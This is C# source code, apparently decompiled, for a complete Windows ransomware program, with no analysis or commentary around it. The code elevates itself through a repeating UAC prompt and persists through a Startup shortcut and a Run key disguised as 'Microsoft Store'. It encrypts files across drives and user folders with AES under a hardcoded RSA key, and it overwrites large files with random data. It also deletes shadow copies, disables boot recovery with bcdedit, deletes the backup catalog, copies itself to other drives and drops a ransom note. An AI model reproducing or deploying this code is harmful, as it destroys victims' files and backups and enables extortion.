		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".docx",
		".txt"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>17g6W8G9XEkOqVI9pO7fuZIwyfYdEENRevMhkTLjReR4+bfGm6gp07WYkvbjIbT7vbm0tQQoyYwxKw7jDVvWhhWTIoJ/SoZA1/egHQ2FZc69ZoRX8SqK0e0B5BYVlCOAWv+IH5CGAZ8sP83wIMqJ/eiiqLSZ8UKrzlNHBtZMFUU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
